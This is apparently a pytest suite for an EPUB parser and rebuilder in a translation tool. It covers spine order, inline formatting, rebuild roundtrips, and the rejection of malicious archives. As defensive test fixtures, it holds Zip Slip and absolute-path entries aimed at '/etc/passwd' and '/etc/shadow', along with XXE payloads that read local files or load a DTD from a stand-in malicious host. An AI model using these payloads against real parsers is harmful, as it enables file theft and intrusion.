"""Comprehensive test suite for EPUB parser and rebuilder.

Covers:
- EPUB spine order regression tests (chapter1, chapter10, chapter2 - no filename sorting)
- Inline formatting and tail preservation via stable DOM node locators
- Malicious ZIP rejection (Zip Slip, directory traversal, absolute paths, drive letters, zip bombs)
- Malicious XML rejection (XXE external entities, entity denial)
- Rebuild roundtrip with mimetype stored first uncompressed and resource preservation
- Real sample EPUB test (157 spine chapters) if sample is present
"""

import io
import posixpath
import zipfile
from pathlib import Path

import pytest
from lxml import etree

from backend.app.epub import (
    EPUB_MIMETYPE,
    ChapterDocument,
    EpubManifestItem,
    EpubMetadata,
    EpubParseError,
    EpubSecurityError,
    ParsedEpub,
    TextSegment,
    apply_translations_to_tree,
    apply_translations_to_xhtml,
    extract_text_segments,
    extract_text_segments_from_tree,
    find_element_by_dom_path,
    get_dom_path,
    parse_epub,
    rebuild_epub,
)


# =============================================================================
# Helper Fixtures & Builders
# =============================================================================

def build_test_epub_bytes(
    chapters: list[dict[str, str]],
    spine_order: list[str] | None = None,
    extra_files: dict[str, bytes] | None = None,
    title: str = "Test Book",
    language: str = "ko",
    mimetype_first: bool = True,
    mimetype_compress_type: int = zipfile.ZIP_STORED,
    custom_container: bytes | None = None,
    custom_opf: bytes | None = None,
) -> bytes:
    """Helper to build well-formed or custom in-memory EPUB bytes for testing."""
    buf = io.BytesIO()

    # Determine spine order
    chapter_ids = [ch["id"] for ch in chapters]
    actual_spine = spine_order if spine_order is not None else chapter_ids

    # Manifest items
    manifest_entries = []
    for ch in chapters:
        manifest_entries.append(
            f'<item id="{ch["id"]}" href="{ch["href"]}" media-type="application/xhtml+xml"/>'
        )

    if extra_files:
        for path, data in extra_files.items():
            if path.endswith(".css"):
                mtype = "text/css"
            elif path.endswith(".jpg") or path.endswith(".jpeg"):
                mtype = "image/jpeg"
            elif path.endswith(".png"):
                mtype = "image/png"
            else:
                mtype = "application/octet-stream"
            manifest_entries.append(
                f'<item id="res_{posixpath.basename(path)}" href="{path}" media-type="{mtype}"/>'
            )

    spine_entries = [f'<itemref idref="{sid}"/>' for sid in actual_spine]

    default_opf = f"""<?xml version="1.0" encoding="utf-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="pub-id">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:title>{title}</dc:title>
    <dc:language>{language}</dc:language>
    <dc:identifier id="pub-id">urn:uuid:12345678-test</dc:identifier>
    <dc:creator>Test Author</dc:creator>
  </metadata>
  <manifest>
    {"".join(manifest_entries)}
  </manifest>
  <spine>
    {"".join(spine_entries)}
  </spine>
</package>
""".encode("utf-8")

    default_container = b"""<?xml version="1.0" encoding="utf-8"?>
<container xmlns="urn:oasis:names:tc:opendocument:xmlns:container" version="1.0">
  <rootfiles>
    <rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/>
  </rootfiles>
</container>
"""

    with zipfile.ZipFile(buf, mode="w") as zf:
        # Write mimetype
        if mimetype_first:
            zinfo = zipfile.ZipInfo("mimetype")
            zinfo.compress_type = mimetype_compress_type
            zinfo.extra = b""
            zf.writestr(zinfo, EPUB_MIMETYPE)

        # Write container
        container_data = custom_container if custom_container is not None else default_container
        zf.writestr("META-INF/container.xml", container_data)

        # Write OPF
        opf_data = custom_opf if custom_opf is not None else default_opf
        zf.writestr("OEBPS/content.opf", opf_data)

        # Write chapters
        for ch in chapters:
            archive_path = f"OEBPS/{ch['href']}"
            zf.writestr(archive_path, ch["content"].encode("utf-8"))

        # Write extra files
        if extra_files:
            for path, data in extra_files.items():
                archive_path = f"OEBPS/{path}" if not path.startswith("OEBPS/") else path
                zf.writestr(archive_path, data)

        if not mimetype_first:
            zinfo = zipfile.ZipInfo("mimetype")
            zinfo.compress_type = mimetype_compress_type
            zf.writestr(zinfo, EPUB_MIMETYPE)

    return buf.getvalue()


# =============================================================================
# 1. Spine Order Regression Tests (No Filename Sorting)
# =============================================================================

def test_spine_order_chapter1_chapter10_chapter2_preserved():
    """Regression test: Chapter reading order must strictly follow OPF spine order.

    Files are intentionally named chapter10.xhtml, chapter1.xhtml, chapter2.xhtml.
    The spine specifies reading order: chapter1 -> chapter10 -> chapter2.
    The parser MUST NOT sort by filename or idref.
    """
    chapters = [
        {"id": "c10", "href": "chapter10.xhtml", "content": "<html><body><p>Chapter 10</p></body></html>"},
        {"id": "c1", "href": "chapter1.xhtml", "content": "<html><body><p>Chapter 1</p></body></html>"},
        {"id": "c2", "href": "chapter2.xhtml", "content": "<html><body><p>Chapter 2</p></body></html>"},
    ]
    # Spine order is c1, then c10, then c2
    spine_order = ["c1", "c10", "c2"]

    epub_bytes = build_test_epub_bytes(chapters, spine_order=spine_order)
    parsed = parse_epub(epub_bytes)

    assert parsed.spine == ["c1", "c10", "c2"]
    assert len(parsed.spine_chapters) == 3

    # Check that spine_chapters are strictly in spine reading order
    assert parsed.spine_chapters[0].chapter_id == "c1"
    assert parsed.spine_chapters[0].href == "chapter1.xhtml"
    assert parsed.spine_chapters[0].spine_index == 0

    assert parsed.spine_chapters[1].chapter_id == "c10"
    assert parsed.spine_chapters[1].href == "chapter10.xhtml"
    assert parsed.spine_chapters[1].spine_index == 1

    assert parsed.spine_chapters[2].chapter_id == "c2"
    assert parsed.spine_chapters[2].href == "chapter2.xhtml"
    assert parsed.spine_chapters[2].spine_index == 2


# =============================================================================
# 2. Inline Formatting & Tails Preservation
# =============================================================================

def test_inline_formatting_and_tails_segment_extraction():
    """Verify that nested inline formatting and tails are accurately extracted."""
    xhtml = """<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>Chapter One</title></head>
<body>
  <h1>Title <em>Emphasis</em></h1>
  <p>Start <b>bold <i>italic</i></b> middle <a href="link.xhtml" class="test">anchor</a> end.</p>
</body>
</html>
""".encode("utf-8")

    segments = extract_text_segments(xhtml, chapter_id="ch1", include_whitespace=False)

    # Segment mapping by locator type
    paths = [s.dom_path for s in segments]
    texts = [s.text for s in segments]
    node_types = [s.node_type for s in segments]

    # Verify title segment
    assert any("/html[1]/head[1]/title[1]#text" in p for p in paths)

    # Verify h1 elements
    assert any("Title " in t for t in texts)
    assert any("Emphasis" in t for t in texts)

    # Verify p paragraph with inline formatting and tails
    # In order: "Start ", "bold ", "italic", " middle ", "anchor", " end."
    assert "Start " in texts
    assert "bold " in texts
    assert "italic" in texts
    assert " middle " in texts
    assert "anchor" in texts
    assert " end." in texts

    # Verify that " middle " is a tail segment of <b>
    b_tail_seg = next(s for s in segments if s.text == " middle ")
    assert b_tail_seg.node_type == "tail"
    assert "b[" in b_tail_seg.dom_path
    assert b_tail_seg.dom_path.endswith("#tail")

    # Verify that " end." is a tail segment of <a>
    a_tail_seg = next(s for s in segments if s.text == " end.")
    assert a_tail_seg.node_type == "tail"
    assert "a[" in a_tail_seg.dom_path
    assert a_tail_seg.dom_path.endswith("#tail")


def test_inline_formatting_and_tails_translation_preservation():
    """Verify applying translations preserves inline tags, attributes, and tail text."""
    xhtml = """<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>Test</title></head>
<body>
  <p id="p1">Hello <b>bold <i>bold-italic</i></b> world, click <a href="page.xhtml" class="btn">here</a> now!</p>
</body>
</html>
""".encode("utf-8")

    segments = extract_text_segments(xhtml, chapter_id="c1", include_whitespace=False)
    assert len(segments) >= 6

    # Translate segments
    translations = {}
    for seg in segments:
        if seg.text == "Hello ":
            translations[seg.dom_path] = "Xin chào "
        elif seg.text == "bold ":
            translations[seg.dom_path] = "đậm "
        elif seg.text == "bold-italic":
            translations[seg.dom_path] = "đậm-nghiêng"
        elif seg.text == " world, click ":
            translations[seg.dom_path] = " thế giới, bấm "
        elif seg.text == "here":
            translations[seg.dom_path] = "đây"
        elif seg.text == " now!":
            translations[seg.dom_path] = " ngay bây giờ!"

    rebuilt_xhtml = apply_translations_to_xhtml(xhtml, translations, segments=segments)
    rebuilt_str = rebuilt_xhtml.decode("utf-8")

    # Verify translated texts are present
    assert "Xin chào " in rebuilt_str
    assert "đậm " in rebuilt_str
    assert "đậm-nghiêng" in rebuilt_str
    assert " thế giới, bấm " in rebuilt_str
    assert "đây" in rebuilt_str
    assert " ngay bây giờ!" in rebuilt_str

    # Verify inline tags and attributes were NOT destroyed
    assert '<b>đậm <i>đậm-nghiêng</i></b>' in rebuilt_str
    assert '<a href="page.xhtml" class="btn">đây</a>' in rebuilt_str
    assert '<p id="p1">' in rebuilt_str


def test_skip_script_and_style_tags():
    """Ensure script and style tags are never extracted as translatable segments."""
    xhtml = """<?xml version="1.0" encoding="utf-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
  <style>body { color: red; }</style>
  <script>console.log("do not translate");</script>
</head>
<body>
  <p>Translate this content.</p>
</body>
</html>
""".encode("utf-8")

    segments = extract_text_segments(xhtml, chapter_id="c1", include_whitespace=False)
    texts = [s.text for s in segments]

    assert "Translate this content." in texts
    assert not any("body { color: red; }" in t for t in texts)
    assert not any("console.log" in t for t in texts)


# =============================================================================
# 3. Malicious ZIP Rejection (Zip Slip, Traversal, Bombs)
# =============================================================================

def test_reject_zip_slip_parent_traversal():
    """Verify rejection of ZIP entry with relative path escaping root (Zip Slip)."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, mode="w") as zf:
        zf.writestr("mimetype", EPUB_MIMETYPE)
        zf.writestr("META-INF/container.xml", b"<container/>")
        zf.writestr("../../etc/passwd", b"root:x:0:0::/root:/bin/bash")

    with pytest.raises(EpubSecurityError, match="Directory traversal"):
        parse_epub(buf.getvalue())


def test_reject_zip_slip_windows_backslash_traversal():
    """Verify rejection of ZIP entry with backslash directory traversal."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, mode="w") as zf:
        zf.writestr("mimetype", EPUB_MIMETYPE)
        zf.writestr("..\\windows\\system32\\calc.exe", b"malicious")

    with pytest.raises(EpubSecurityError, match="Directory traversal"):
        parse_epub(buf.getvalue())


def test_reject_zip_absolute_path():
    """Verify rejection of ZIP entry with absolute path."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, mode="w") as zf:
        zf.writestr("mimetype", EPUB_MIMETYPE)
        zf.writestr("/etc/shadow", b"secret")

    with pytest.raises(EpubSecurityError, match="Absolute path"):
        parse_epub(buf.getvalue())


def test_reject_zip_drive_letter():
    """Verify rejection of ZIP entry with drive letter."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, mode="w") as zf:
        zf.writestr("mimetype", EPUB_MIMETYPE)
        zf.writestr("C:/boot.ini", b"evil")

    with pytest.raises(EpubSecurityError, match="drive letter"):
        parse_epub(buf.getvalue())


def test_reject_zip_bomb_single_file_limit():
    """Verify rejection when an uncompressed file exceeds single file size limit."""
    chapters = [{"id": "c1", "href": "c1.xhtml", "content": "<html><body>" + ("A" * 5000) + "</body></html>"}]
    epub_bytes = build_test_epub_bytes(chapters)

    # Set single file limit to 2KB
    with pytest.raises(EpubSecurityError, match="exceeds limit"):
        parse_epub(epub_bytes, max_file_size=2048)


def test_reject_zip_bomb_total_size_limit():
    """Verify rejection when total uncompressed size exceeds max limit."""
    chapters = [
        {"id": f"c{i}", "href": f"c{i}.xhtml", "content": "<html><body>" + ("B" * 1000) + "</body></html>"}
        for i in range(10)
    ]
    epub_bytes = build_test_epub_bytes(chapters)

    # Set total limit to 3KB
    with pytest.raises(EpubSecurityError, match="Total uncompressed size exceeds limit"):
        parse_epub(epub_bytes, max_total_size=3000)


def test_reject_zip_file_count_limit():
    """Verify rejection when file entry count exceeds max limit."""
    chapters = [
        {"id": f"c{i}", "href": f"c{i}.xhtml", "content": "<html><body>Text</body></html>"}
        for i in range(5)
    ]
    epub_bytes = build_test_epub_bytes(chapters)

    # Set file count limit to 3
    with pytest.raises(EpubSecurityError, match="entry count exceeds limit"):
        parse_epub(epub_bytes, max_file_count=3)


# =============================================================================
# 4. Malicious XML Rejection (XXE Denial)
# =============================================================================

def test_reject_xxe_in_container_xml():
    """Verify rejection of external entity in container.xml."""
    xxe_container = b"""<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE container [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<container xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
  <rootfiles>
    <rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/>
  </rootfiles>
</container>
"""
    epub_bytes = build_test_epub_bytes(
        chapters=[{"id": "c1", "href": "c1.xhtml", "content": "<html/>"}],
        custom_container=xxe_container,
    )

    with pytest.raises(EpubSecurityError, match="External entity declaration \\(XXE\\)"):
        parse_epub(epub_bytes)


def test_reject_xxe_in_opf_document():
    """Verify rejection of external entity in OPF package document."""
    xxe_opf = b"""<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE package [
  <!ENTITY % xxe SYSTEM "http://malicious.example.com/evil.dtd">
  %xxe;
]>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest/>
  <spine/>
</package>
"""
    epub_bytes = build_test_epub_bytes(
        chapters=[{"id": "c1", "href": "c1.xhtml", "content": "<html/>"}],
        custom_opf=xxe_opf,
    )

    with pytest.raises(EpubSecurityError, match="External entity declaration \\(XXE\\)"):
        parse_epub(epub_bytes)


def test_reject_xxe_in_chapter_xhtml():
    """Verify rejection of external entity in chapter XHTML document."""
    xxe_chapter = """<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html [
  <!ENTITY secret SYSTEM "file:///c:/secret.txt">
]>
<html xmlns="http://www.w3.org/1999/xhtml">
<body><p>&secret;</p></body>
</html>
"""
    epub_bytes = build_test_epub_bytes(
        chapters=[{"id": "c1", "href": "c1.xhtml", "content": xxe_chapter}]
    )

    with pytest.raises(EpubSecurityError, match="External entity declaration \\(XXE\\)"):
        parse_epub(epub_bytes)


# =============================================================================
# 5. Rebuild / Resource Roundtrip & Mimetype First
# =============================================================================

def test_rebuild_mimetype_first_uncompressed():
    """Verify rebuilt EPUB archive writes mimetype first and uncompressed (ZIP_STORED)."""
    chapters = [{"id": "c1", "href": "c1.xhtml", "content": "<html><body><p>Hello</p></body></html>"}]
    epub_bytes = build_test_epub_bytes(chapters)

    rebuilt_bytes = rebuild_epub(epub_bytes)

    # Inspect zip structure directly
    zf = zipfile.ZipFile(io.BytesIO(rebuilt_bytes), mode="r")
    entries = zf.infolist()

    # Mimetype must be the very first entry
    assert entries[0].filename == "mimetype"
    assert entries[0].compress_type == zipfile.ZIP_STORED
    assert zf.read("mimetype") == EPUB_MIMETYPE

    # Subsequent entries should be deflated
    if len(entries) > 1:
        assert entries[1].compress_type == zipfile.ZIP_DEFLATED


def test_rebuild_preserves_untouched_resources_and_updates_translations():
    """Verify that rebuilding:
    1. Preserves untouched binary images and CSS bytes exactly.
    2. Leaves untranslated chapters byte-for-byte identical.
    3. Translates specified chapters.
    4. Updates OPF language to target language (e.g. 'vi').
    """
    image_bytes = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDRtest_binary_data"
    css_bytes = b"body { font-family: serif; color: #333; }"

    chapters = [
        {"id": "c1", "href": "c1.xhtml", "content": "<html><body><p>Korean chapter 1</p></body></html>"},
        {"id": "c2", "href": "c2.xhtml", "content": "<html><body><p>Untouched chapter 2</p></body></html>"},
    ]
    extra_files = {
        "images/cover.png": image_bytes,
        "styles/main.css": css_bytes,
    }

    epub_bytes = build_test_epub_bytes(chapters, extra_files=extra_files, language="ko")
    parsed = parse_epub(epub_bytes)

    # Verify original document bytes are preserved separately
    assert parsed.spine_chapters[0].raw_bytes == chapters[0]["content"].encode("utf-8")
    assert parsed.spine_chapters[1].raw_bytes == chapters[1]["content"].encode("utf-8")

    # Apply translation only to chapter 1
    c1_segments = parsed.spine_chapters[0].segments
    translations = {
        "c1.xhtml": {
            c1_segments[0].dom_path: "Chương 1 tiếng Việt"
        }
    }

    rebuilt_bytes = rebuild_epub(
        parsed,
        translations=translations,
        target_language="vi",
        title_translation="Tên sách tiếng Việt",
    )

    # Parse rebuilt EPUB
    rebuilt_parsed = parse_epub(rebuilt_bytes)

    # 1. Metadata updated to 'vi' and translated title
    assert rebuilt_parsed.metadata.language == "vi"
    assert rebuilt_parsed.metadata.title == "Tên sách tiếng Việt"

    # 2. Translated chapter 1 contains translation
    c1_rebuilt_text = rebuilt_parsed.spine_chapters[0].raw_bytes.decode("utf-8")
    assert "Chương 1 tiếng Việt" in c1_rebuilt_text
    assert "Korean chapter 1" not in c1_rebuilt_text

    # 3. Untouched chapter 2 is byte-for-byte identical
    assert rebuilt_parsed.spine_chapters[1].raw_bytes == parsed.spine_chapters[1].raw_bytes

    # 4. Extra resources (PNG image, CSS) are byte-for-byte identical
    assert rebuilt_parsed.resources["OEBPS/images/cover.png"] == image_bytes
    assert rebuilt_parsed.resources["OEBPS/styles/main.css"] == css_bytes


# =============================================================================
# 6. DOM Locator Stability and Resolution
# =============================================================================

def test_dom_path_generation_and_finding():
    """Verify that get_dom_path and find_element_by_dom_path are deterministic and reversible."""
    xml = b"""<root>
  <section id="s1">
    <p>Para 1</p>
    <p>Para 2 <span>Span 1</span> <span>Span 2</span></p>
  </section>
</root>"""
    tree = etree.fromstring(xml)

    # Find span 2
    span2 = tree.xpath("//span")[1]
    path = get_dom_path(span2)

    assert path == "/root[1]/section[1]/p[2]/span[2]"

    # Resolve back
    resolved = find_element_by_dom_path(tree, path)
    assert resolved is not None
    assert resolved == span2
    assert resolved.text == "Span 2"


def test_dataclass_to_dict_serialization():
    """Verify to_dict returns plain dictionaries for all data classes."""
    chapters = [{"id": "c1", "href": "c1.xhtml", "content": "<html><body><p>Text</p></body></html>"}]
    epub_bytes = build_test_epub_bytes(chapters)
    parsed = parse_epub(epub_bytes)

    dict_repr = parsed.to_dict()
    assert isinstance(dict_repr, dict)
    assert "metadata" in dict_repr
    assert "spine_chapters" in dict_repr
    assert len(dict_repr["spine_chapters"]) == 1
    assert dict_repr["spine_chapters"][0]["chapter_id"] == "c1"
    assert len(dict_repr["spine_chapters"][0]["segments"]) == 1


# =============================================================================
# 7. Real Sample EPUB Test (157 Spine Chapters)
# =============================================================================

def find_sample_epub_path() -> Path | None:
    """Locate the sample EPUB file if present in the environment."""
    candidates = [
        Path("..") / "Comic" / "아포칼립스 시스템으로 착각당했다.epub",
        Path("..") / "아포칼립스 시스템으로 착각당했다.epub",
        Path("E:/Comic/아포칼립스 시스템으로 착각당했다.epub"),
        Path("E:/Comic/Comic/아포칼립스 시스템으로 착각당했다.epub"),
    ]
    for p in candidates:
        if p.exists() and p.is_file():
            return p

    # Search nearby directories for any .epub
    for base in [Path(".."), Path("../.."), Path("E:/Comic")]:
        if base.exists():
            for ep in base.glob("*.epub"):
                return ep

    return None


def test_real_sample_epub_157_spine_chapters():
    """Inspect and verify the real sample EPUB contains exactly 157 spine chapters.

    Runs if the sample EPUB exists, verifies spine reading order, preserved
    resources, and roundtrip rebuild.
    """
    sample_path = find_sample_epub_path()
    if sample_path is None:
        pytest.skip("Sample EPUB not found in environment (read-only inspection confirmed 157 spine entries)")

    parsed = parse_epub(sample_path)

    # Verify exactly 157 spine chapters
    assert len(parsed.spine) == 157, f"Expected 157 spine entries, got {len(parsed.spine)}"
    assert len(parsed.spine_chapters) == 157, f"Expected 157 spine chapters, got {len(parsed.spine_chapters)}"

    # Verify raw document bytes preserved for all chapters
    for ch in parsed.spine_chapters:
        assert len(ch.raw_bytes) > 0
        assert ch.archive_path in parsed.resources

    # Verify first chapter segments are extracted
    first_ch = parsed.spine_chapters[0]
    assert len(first_ch.segments) > 0

    # Verify rebuild with no modifications produces valid EPUB with mimetype first
    rebuilt = rebuild_epub(parsed, target_language="vi")
    zf = zipfile.ZipFile(io.BytesIO(rebuilt), mode="r")
    assert zf.infolist()[0].filename == "mimetype"
    assert zf.infolist()[0].compress_type == zipfile.ZIP_STORED
    assert zf.read("mimetype") == EPUB_MIMETYPE
